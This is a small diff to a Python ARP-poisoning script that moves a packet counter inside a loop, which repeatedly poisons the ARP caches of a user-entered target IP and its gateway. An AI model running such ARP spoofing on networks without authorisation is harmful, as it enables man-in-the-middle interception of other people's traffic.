@@ -49,9 +49,9 @@ if __name__ == "__main__":
     poisonIP = input(str("Enter the IP to poison (Modem, Router): "))
     try:
         while True:
+            number += 1
             arp_poisoning(targetIP, poisonIP)
             arp_poisoning(poisonIP, targetIP)
-            number += 1
             print(f"\rPackages are being sent from address {targetIP} to address {poisonIP}", end="")
             print(str(number))
             time.sleep(3)
